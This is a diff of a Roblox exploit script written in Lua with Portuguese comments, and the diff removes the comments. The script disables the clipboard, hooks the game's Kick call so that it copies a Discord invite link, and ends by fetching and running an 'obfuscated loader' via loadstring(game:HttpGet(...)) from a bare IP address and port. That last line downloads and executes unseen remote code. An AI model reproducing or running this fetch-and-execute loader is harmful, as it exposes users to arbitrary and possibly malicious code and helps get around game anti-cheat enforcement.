@@ -1,18 +1,7 @@
---==============================
--- 1) Backup do clipboard real
---==============================
 local real_setclipboard = setclipboard
 
---==============================
--- 2) Bloqueia clipboard global
---==============================
-setclipboard = function(...)
-    -- clipboard desativado
-end
+setclipboard = function(...) end
 
---==============================
--- 3) Hook no Kick (último frame)
---==============================
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
@@ -25,29 +14,16 @@ mt.__namecall = newcclosure(function(self, ...)
     local method = getnamecallmethod()
 
     if self == LocalPlayer and method == "Kick" then
-        -- 🔥 ÚLTIMO MOMENTO ANTES DO CLIENT MORRER
-
-        -- restaura clipboard
         setclipboard = real_setclipboard
-
-        -- tenta copiar (clipboard é async, então pcall)
         pcall(function()
             setclipboard("https://discord.gg/KuNaFZUbBs")
         end)
-
-        -- (opcional, mais confiável)
-        -- writefile("dump.txt", "TEXTO QUE EU QUERO COPIAR")
-
-        -- deixa o kick acontecer normalmente
         return old_namecall(self, ...)
     end
 
     return old_namecall(self, ...)
 end)
 
---==============================
--- 4) Executa o loader ofuscado
---==============================
 loadstring(game:HttpGet(
     "http://109.71.240.235:3910/api/run/eyJpZCI6ImMxNmMyOTc4LTFhZDAtNDY1Yy04MGVkLTVkMDEzZjdhN2ZhOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"
 ))()
